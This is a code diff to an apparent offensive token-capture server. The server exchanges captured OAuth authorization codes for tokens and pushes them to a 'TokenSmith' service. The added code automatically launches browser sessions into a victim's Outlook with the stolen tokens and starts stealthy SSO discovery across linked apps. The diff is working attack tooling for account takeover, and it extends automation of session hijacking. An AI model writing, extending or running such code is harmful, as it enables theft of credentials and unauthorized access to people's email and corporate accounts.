@@ -243,9 +243,16 @@ def exchange_auth_code(payload, server_ctx):
         store_tokens(token_data, payload, server_ctx)
         stats['exchanges'] += 1
 
-        # Optional: push to TokenSmith
+        # Optional: push to TokenSmith and auto-launch/discover
         if server_ctx.tokensmith_url:
-            push_to_tokensmith(token_data, server_ctx.tokensmith_url, payload)
+            token_id = push_to_tokensmith(token_data, server_ctx.tokensmith_url, payload)
+            if token_id:
+                if getattr(server_ctx, 'auto_launch', False):
+                    auto_launch_session(server_ctx.tokensmith_url, token_id,
+                                        getattr(server_ctx, 'launch_target', 'outlook'))
+                if getattr(server_ctx, 'auto_discover', False):
+                    auto_discover_sso(server_ctx.tokensmith_url, token_id,
+                                      getattr(server_ctx, 'discover_mode', 'stealth'))
 
     except urllib.error.HTTPError as e:
         error_body = e.read().decode('utf-8', errors='replace')
@@ -386,10 +393,59 @@ def push_to_tokensmith(token_data, tokensmith_url, original_payload=None):
         token_id = result.get('token_id', result.get('id', 'unknown'))
         print(f"  {C.GREEN}{C.BOLD}PUSHED TO TOKENSMITH{C.RESET}")
         print(f"  {C.DIM}Token ID: {token_id}{C.RESET}")
+        return token_id
 
     except Exception as e:
         print(f"  {C.YELLOW}TokenSmith push failed: {e}{C.RESET}")
         print(f"  {C.DIM}Tokens are still saved locally — import manually{C.RESET}")
+        return None
+
+
+def auto_launch_session(tokensmith_url, token_id, target="outlook"):
+    """Automatically launch a browser session after token capture."""
+    if not tokensmith_url:
+        return
+    try:
+        url = tokensmith_url.rstrip('/') + '/api/sessions/launch'
+        payload = json.dumps({
+            "token_id": token_id,
+            "target": target,
+        }).encode('utf-8')
+        req = urllib.request.Request(
+            url,
+            data=payload,
+            headers={'Content-Type': 'application/json'},
+            method='POST',
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            data = json.loads(resp.read().decode('utf-8'))
+        print(f"  {C.GREEN}[+] Auto-launched browser session: {data.get('session_id', 'unknown')} → {target}{C.RESET}")
+    except Exception as e:
+        print(f"  {C.YELLOW}[!] Auto-launch error: {e}{C.RESET}")
+
+
+def auto_discover_sso(tokensmith_url, token_id, mode="stealth"):
+    """Automatically start SSO chain discovery after token capture."""
+    if not tokensmith_url:
+        return
+    try:
+        url = tokensmith_url.rstrip('/') + '/api/sessions/discover'
+        payload = json.dumps({
+            "token_id": token_id,
+            "mode": mode,
+        }).encode('utf-8')
+        req = urllib.request.Request(
+            url,
+            data=payload,
+            headers={'Content-Type': 'application/json'},
+            method='POST',
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            data = json.loads(resp.read().decode('utf-8'))
+        print(f"  {C.GREEN}[+] SSO Discovery started (job {data.get('job_id', 'unknown')}): "
+              f"{data.get('targets', 0)} targets in {mode} mode{C.RESET}")
+    except Exception as e:
+        print(f"  {C.YELLOW}[!] SSO Discovery error: {e}{C.RESET}")
 
 
 # ─────────────────────────────────────────────────────────────
@@ -509,6 +565,14 @@ Set in wrangler.toml:
                         help='Address to bind to (default: 0.0.0.0)')
     parser.add_argument('--tokensmith-url', type=str, default=None,
                         help='TokenSmith URL for auto-import (e.g., http://localhost:1337)')
+    parser.add_argument('--auto-launch', action='store_true', default=False,
+                        help='Auto-launch browser session after token capture')
+    parser.add_argument('--launch-target', default='outlook',
+                        help='Target app for auto-launch (default: outlook)')
+    parser.add_argument('--auto-discover', action='store_true', default=False,
+                        help='Auto-start SSO discovery after token capture')
+    parser.add_argument('--discover-mode', default='stealth', choices=['stealth', 'demo'],
+                        help='Discovery mode (default: stealth)')
 
     args = parser.parse_args()
 
@@ -525,6 +589,10 @@ Set in wrangler.toml:
         print(f"\n  {C.DIM}Logging to:{C.RESET} {args.output}")
     if args.tokensmith_url:
         print(f"  {C.GREEN}TokenSmith auto-push:{C.RESET} {args.tokensmith_url}")
+        if args.auto_launch:
+            print(f"  {C.GREEN}Auto-launch:{C.RESET} enabled → {args.launch_target}")
+        if args.auto_discover:
+            print(f"  {C.GREEN}Auto-discover:{C.RESET} enabled ({args.discover_mode} mode)")
     else:
         print(f"  {C.DIM}TokenSmith auto-push:{C.RESET} disabled (use --tokensmith-url to enable)")
     print(f"\n  {C.DIM}Waiting for captures... (Ctrl+C to stop){C.RESET}\n")
@@ -535,6 +603,10 @@ Set in wrangler.toml:
     server.log_file = args.output
     server.show_raw = args.show_raw
     server.tokensmith_url = args.tokensmith_url
+    server.auto_launch = args.auto_launch
+    server.launch_target = args.launch_target
+    server.auto_discover = args.auto_discover
+    server.discover_mode = args.discover_mode
 
     try:
         server.serve_forever()
